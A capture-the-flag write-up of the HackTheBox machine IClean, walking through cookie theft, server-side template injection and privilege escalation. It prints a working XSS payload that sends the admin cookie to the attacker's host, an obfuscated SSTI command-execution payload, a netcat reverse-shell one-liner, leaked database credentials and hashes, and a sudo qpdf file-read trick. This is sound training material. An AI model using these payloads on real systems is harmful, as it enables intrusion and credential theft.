---
title: Iclean - HackTheBox
date: 2025-03-05 12:00:00 +/-0000
categories: [HackTheBox, Iclean]
image:
  path: ../assets/img/iclean/IClean.png
tags: [hackthebox, iclean]     # TAG names should always be lowercase
description: Iclean is a medium-difficulty machine on HackTheBox. A vulnerable web server allows attackers to send crafted requests to capture an administrator’s session cookie. The dashboard is then found to be vulnerable to SSTI, enabling remote code execution. After extracting and cracking password hashes from the databases, SSH access is obtained. Finally, a custom binary that can be executed with root privileges via sudo allows access to the root flag.
author: baptist3-ng
---

## ▫️Information

- **Name** : IClean
- **Author** : [LazyTitan33](https://app.hackthebox.com/users/512308)
- **Difficulty** : Medium
- **OS** : Linux


## ▫️Enumeration

Start a full TCP port scan with **RustScan** : 
```bash
rustscan -a 10.10.11.12 -r 1-65535 -- -A -oN nmap.txt
```

There are two open ports : 
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2cf90777e3f13a36dbf23b94e3b7cfb2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=
|   256 4a919ff274c04181524df1ff2d01786b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

SSH and HTTP services are running.

The *OpenSSH* version doesn't seem vulnerable, so we will focus on the *Apache* server.

### Exploring Website

Go to ``http://10.10.11.12/``. It is redirecting to ``http://capiclean.htb``.

Add into ``/etc/hosts`` file the following line : 
```bash
10.10.11.12    capiclean.htb
```

Now, return on the website. We can try to enumerate subdomains, directories. There is a ``/quote`` page which can be interesting.

![Quote WebPage](../assets/img/iclean/quote.png)

Enter a random email and click on submit : 

![Quote response](../assets/img/iclean/quote_response.png)

Use **BurpSuite** to intercept the request and see what is happening in background : 

```bash
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1

service=Tile+%26+Grout&email=random%40gmail.com
```

We could try to change ``service`` field and see the response but nothing.

The message gives a hint : 
```text
Your quote request was sent to our management team. They will reach out soon via email. Thank you for the interest you have shown in our services.
```

Maybe we could execute code when an administrator reads our request.
Let's try this ! 

Use a simple payload like this one to grab the admin cookie : 
```bash
<img src=x onerror=this.src='http://{YOUR-IP}:{PORT}/?c='+document.cookie>
```

Wait ~30 seconds and... 
```bash
10.10.11.12 - - [13/Apr/2024 20:51:06] "GET /?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhrBWw.LQ7bfijdzg10JhSZRFmUakq7yZ0 HTTP/1.1" 200 -
10.10.11.12 - - [13/Apr/2024 20:51:06] "GET /?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhrBWw.LQ7bfijdzg10JhSZRFmUakq7yZ0 HTTP/1.1" 200 -
10.10.11.12 - - [13/Apr/2024 20:51:06] "GET /?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhrBWw.LQ7bfijdzg10JhSZRFmUakq7yZ0 HTTP/1.1" 200 -
10.10.11.12 - - [13/Apr/2024 20:51:06] "GET /?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhrBWw.LQ7bfijdzg10JhSZRFmUakq7yZ0 HTTP/1.1" 200 -
```

... we have a cookie ! 

### Going deeper 

Use **Gobuster** a second time with our new cookie : 
```bash
gobuster dir --url http://capiclean.htb/ -w /opt/seclists/Discovery/Web-Content/big.txt -x html,php,txt --cookies 'session={COOKIE}'
```

A ``/dashboard`` appears. Open a web browser and go on : 

> Add ``Cookie: session={COOKIE}`` line with **BurpSuite** to access on the page !
{: .prompt-tip }

![BurpSuite Cookie](../assets/img/iclean/burp1.png)


> Add the cookie with **Cookie-Editor** extension !
{: .prompt-tip }

![Cookie-Editor](../assets/img/iclean/cookie_editor.png)

Now it is easier to browse !

There are four new pages : 
- ``/InvoiceGenerator``
- ``/QRGenerator``
- ``/EditServices``
- ``/QuoteRequests``

Like in the previous part, we need to check what we can do and identify the possible inputs.

> *Don't forget to use **BurpSuite** to play with requests !*
{: .prompt-tip }

### SSTI detection

Create an ``invoice``, copy the ``invoice-id`` and generate a QR code.

The ``/QRGenerator`` page is interesting. Generate a new QR : 

![Generate a QR](../assets/img/iclean/generate.png)

The output : 

![Output](../assets/img/iclean/Output.png)

Now, when we try to input other things like ``Hello Wolrd !`` instead of a link : 

![Hello Wolrd !](../assets/img/iclean/Hello.png)

The QR does not appear. Check the source code with ``CTRL + u`` : 

![Source Code](../assets/img/iclean/sc.png)

Our ``Hello Wolrd !`` appears. We can check if there is a **XSS** with this payload ``"><script>alert("XSS !")</script>`` : 

![XSS](../assets/img/iclean/xss.png)

Nice ! Now, we could try if there is a **SSTI** with  `"><h1>{\{7*7}\}</h1>` :

![SSTI](../assets/img/iclean/ssti.png)

The number ``49`` appears ! There is a **SSTI** ! 

> Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. *(Source : BurpSuite)*
{: .prompt-info }


### SSTI exploitation

For this part, we need to find the correct payload. After some tries, I found this one : 

```bash
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
```

> If you can't see the payload, it looks like :
{: .prompt-warning }

![SSTI](../assets/img/iclean/code.png)

The ``_`` character is encoded. It uses Unicode Hex Character.

Inject the payload and we can see that we can execute command as ``www-data`` : 

![Command id](../assets/img/iclean/command.png)

Setup a listener and get a reverse shell with :
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {YOUR-IP} 1337 >/tmp/f
```

![Reverse Shell](../assets/img/iclean/rev.png)

## ▫️User Flag

There is an ``app.py`` file. Read its content with ``cat`` and we find DB credentials : 
```py
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

Connect to the **MySQL** database : 
```bash
(remote) www-data@iclean:/opt/app$ mysql -u iclean -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1188
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Enumerate databases and tables : 
```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use capiclean;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)

mysql>
```

There are two users with hashes. Copy/paste them into a file and use **JohnTheRipper** to bruteforce : 
```bash
john --wordlist=/opt/rockyou.txt hash.txt --format=raw-sha256
```

Wait few seconds :
```bash
consuela:0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean
```

> *Format found with **Haiti** tool !*
{: .prompt-tip }

Connect with SSH as `consuela` and we have the first flag ! 

```bash
consuela@iclean:~$ ls -l user.txt 
-rw-r----- 1 root consuela 33 Apr 13 17:29 user.txt
consuela@iclean:~$ cat user.txt 
2821a0fe852ce0659b72bbcfe326ec75
consuela@iclean:~$ id
uid=1000(consuela) gid=1000(consuela) groups=1000(consuela)
consuela@iclean:~$
```


## ▫️ Privilege Escalation

Run ``sudo -l`` to list our privileges : 

```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
consuela@iclean:~$
```

The `qpdf` doest not look familiar. Try to know more about the binary with ``qpdf --help``.

There is a lot of options.

### Read the root flag 

When we type : ``qpdf --help=usage``, there is an option : 
```bash
- @filename is an argument file; each line is treated as a separate
  command-line argument
```

So , we could use the command ``sudo /usr/bin/qpdf @/root/root.txt -`` to read the root flag :

```bash
consuela@iclean:~$ sudo /usr/bin/qpdf @/root/root.txt -
qpdf: open 9458bb6c2b5741caaf1a6f0df00d711c: No such file or directory
consuela@iclean:~$
```

It works because we know the filename and there is only one line.

## ▫️ Conclusion

Nice box !